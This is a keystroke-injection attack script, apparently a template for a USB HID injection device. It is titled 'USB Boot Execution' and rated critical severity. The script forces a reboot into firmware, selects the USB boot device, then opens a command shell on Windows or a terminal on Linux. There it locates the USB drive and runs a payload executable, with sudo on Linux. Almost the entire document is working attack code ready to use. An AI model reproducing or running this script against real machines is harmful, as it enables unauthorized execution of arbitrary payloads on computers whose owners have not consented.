@id: usb-boot-execute
@name: USB Boot Execution
@description: Forces system to boot from USB device and execute payload
@category: general
@severity: critical
@param: PAYLOAD_PATH | string | optional | Path to payload on USB | \payload.exe
@param: BOOT_MENU_KEY | string | optional | BIOS boot menu key (f12|f11|esc|del) | f12

DELAY 1000
REPEAT 10
  GUI l
  DELAY 200
END_REPEAT
DELAY 500
GUI r
DELAY 500
STRING shutdown /r /fw /t 0
DELAY 300
ENTER
DELAY 5000
REPEAT 30
  KEY {{BOOT_MENU_KEY}}
  DELAY 100
END_REPEAT
DELAY 3000
DOWN
DELAY 200
ENTER
DELAY 10000
IF_OS windows
  DELAY 3000
  GUI r
  DELAY 500
  STRING cmd.exe
  DELAY 300
  ENTER
  DELAY 2000
  STRING wmic logicaldisk get name, drivetype | find "2"
  DELAY 300
  ENTER
  DELAY 1000
  STRING for %d in (D: E: F: G: H: I:) do if exist %d{{PAYLOAD_PATH}} (start %d{{PAYLOAD_PATH}})
  DELAY 300
  ENTER
  DELAY 500
  STRING echo Boot payload executed
  DELAY 300
  ENTER
END_IF
IF_OS linux
  DELAY 3000
  CTRL ALT t
  DELAY 2000
  STRING sudo fdisk -l | grep /dev/sd
  DELAY 300
  ENTER
  DELAY 1000
  STRING sudo mount /dev/sdb1 /mnt 2>/dev/null || sudo mount /dev/sdc1 /mnt 2>/dev/null
  DELAY 300
  ENTER
  DELAY 1000
  STRING ls -la /mnt/
  DELAY 300
  ENTER
  STRING chmod +x /mnt{{PAYLOAD_PATH}} && sudo /mnt{{PAYLOAD_PATH}}
  DELAY 300
  ENTER
END_IF
